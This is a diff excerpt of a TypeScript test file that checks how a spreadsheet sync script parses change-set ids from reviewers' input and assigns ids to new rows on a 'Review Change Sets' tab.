+    expect(f.humanCs("CS-001, CS-004", known)?.ids).toEqual(["CS-001", "CS-004"]);
+    expect(f.humanCs("new", known)).toEqual({ ids: [], note: "new: the agent makes a change set for this comment" });
+    expect(f.humanCs("CS-009", known)?.note).toMatch(/CS-009 is not a change set on Review Change Sets/);
+  });
+});
+
+describe("Review Change Sets rows people start, in a run", () => {
+  test("a Title-only row gets an id and a new agent change set is added at the end", () => {
+    const t = tabs();
+    t["Review Change Sets"].rows = [
+      ["Change-set", "Title", "Sections", "Pages", "Public Comments", "Suggested Revisions", "PC Committee Feedback", "Dispositions", "Agentic status"],
+      ["CS-001", "Fix scope", "", "", "", "", "", "", ""],
+      ["CS-002", "Other", "", "", "", "", "", "", ""],
+      ["", "Split out the typo", "", "", "", "", "", "", ""],
+    ];
+    t["Agent - Change Sets"].rows.push(["CS-007", "From an issue form", "", "", ""]);
+    const rt = runtime(withConfig(t, configRows(buildConfig(folio(), "review/public-comment/sheet-sync.json"))));
+    load(code, rt.g).refreshAll();
+    const ids = rt.written["Review Change Sets"]["Change-set"].map((r) => T((r as unknown[])[0]));
+    expect(ids[2]).toBe("CS-008");
+    expect(ids[3]).toBe("CS-007");
+    expect(T((rt.written["Review Change Sets"]["Title"][3] as unknown[])[0])).toBe("From an issue form");
   });
 });
